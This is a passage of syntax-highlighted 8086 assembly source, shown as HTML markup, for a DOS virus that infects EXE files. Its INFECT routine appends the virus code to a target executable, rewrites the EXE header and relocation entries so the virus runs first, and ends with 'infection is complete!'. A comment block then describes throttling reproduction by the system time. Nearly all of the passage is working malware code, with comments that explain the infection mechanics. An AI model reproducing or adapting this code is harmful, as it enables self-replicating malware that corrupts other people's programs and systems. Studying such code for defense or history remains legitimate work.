</span><span class="sc1">;This routine moves the virus (this program) to the end of the EXE file</span><span class="sc0">
</span><span class="sc1">;Basically, it just copies everything here to there, and then goes and</span><span class="sc0">
</span><span class="sc1">;adjusts the EXE file header and two relocatables in the program, so that</span><span class="sc0">
</span><span class="sc1">;it will work in the new environment. It also makes sure the virus starts</span><span class="sc0">
</span><span class="sc1">;on a paragraph boundary, and adds how many bytes are necessary to do that.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">INFECT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                </span><span class="sc1">;set file pointer, relative to beginning</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">                     </span><span class="sc1">;go to end of file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SETBDY</span><span class="sc0">                  </span><span class="sc1">;lengthen to a paragraph boundary if necessary</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0">         </span><span class="sc1">;last byte of code</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;first byte of code, DS:DX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;move virus code to end of file being attacked with</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;DOS write function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;find 1st relocatable in code (SS)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">REL1</span><span class="sc0">          </span><span class="sc1">;it is at FSIZE+REL1+1 in the file</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;cx:dx is that number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                </span><span class="sc1">;set file pointer to 1st relocatable</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc0">    </span><span class="sc1">;get correct old SS for new program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;from the EXE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;and write it to relocatable REL1+1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">REL1A</span><span class="sc0">         </span><span class="sc1">;put in correct old SP from EXE header</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;at FSIZE+REL1A+1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;cx:dx points to FSIZE+REL1A+1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                </span><span class="sc1">;set file pointer to place to write SP to</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">    </span><span class="sc1">;get correct old SP for infected program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;from EXE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;and write it where it belongs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">REL2</span><span class="sc0">          </span><span class="sc1">;put in correct old CS:IP in program</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;at FSIZE+REL2+1 on disk</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;cx:dx points to FSIZE+REL2+1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                </span><span class="sc1">;set file pointer relavtive to start of file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc0">    </span><span class="sc1">;get correct old CS:IP from EXE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;and write 4 bytes to FSIZE+REL2+1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
                                        </span><span class="sc1">;done writing relocatable vectors</span><span class="sc0">
                                        </span><span class="sc1">;so now adjust the EXE header values</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                </span><span class="sc1">;set file pointer to start of file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;calculate new initial CS (the virus' CS)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;given by (FSIZE/16)-HEADER SIZE (in paragraphs)</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;(exe header size, in paragraphs)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc1">;and save as initial CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0">         </span><span class="sc1">;compute new initial SS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">                  </span><span class="sc1">;using the formula SSi=(CSi + (OFFSET FINAL+16)/16)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;and save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">           </span><span class="sc1">;get initial IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;and save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">STACKSIZE</span><span class="sc0">              </span><span class="sc1">;get initial SP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;and save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;calculate new file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;put it in ax:dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">                 </span><span class="sc1">;and set up the new page count</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;page ct= (ax:dx+512)/512</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;and save it here</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1FFH</span><span class="sc0">                 </span><span class="sc1">;now calculate last page size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;and put it here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">NUMRELS</span><span class="sc0">              </span><span class="sc1">;adjust relocatables counter</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">                  </span><span class="sc1">;and save data at start of file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_HDR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;DOS write function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get number of relocatables in table</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;in order to calculate location of</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;where to add relocatables</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;Location= (No in table-2)*4+Table Offset</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc1">;table offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;dx:ax=end of old table in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                </span><span class="sc1">;set file pointer to table end</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;and set up 2 pointers: init CS = seg of REL1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">REL1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;offset of REL1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">;use EXE_HDR as a buffer to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;save relocatables in for now</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;init CS = seg of REL2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">REL2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;offset of REL2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">;write it to buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;and then write 8 bytes of data in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_HDR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;DOS write function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;that's it, infection is complete!</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This routine determines whether the reproduction code should be executed.</span><span class="sc0">
</span><span class="sc1">;If it returns Z, the reproduction code is executed, otherwise it is not.</span><span class="sc0">
</span><span class="sc1">;Currently, it only executes if the system time variable is a multiple of</span><span class="sc0">
</span><span class="sc1">;TIMECT. As such, the virus will reproduce only 1 out of every TIMECT+1</span><span class="sc0">
</span><span class="sc1">;executions of the program. TIMECT should be 2^n-1</span><span class="sc0">
</span><span class="sc1">;Note that the ret at SR1 is replaced by a NOP by SETSR whenever the program</span><span class="sc0">
</span><span class="sc1">;is run. This makes SHOULDRUN return Z for sure the first time, so it</span><span class="sc0">
</span><span class="sc1">;definitely runs when this loader program is run, but after that, the time must</span><span class="sc0">
</span><span class="sc1">;be an even multiple of TIMECT+1.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
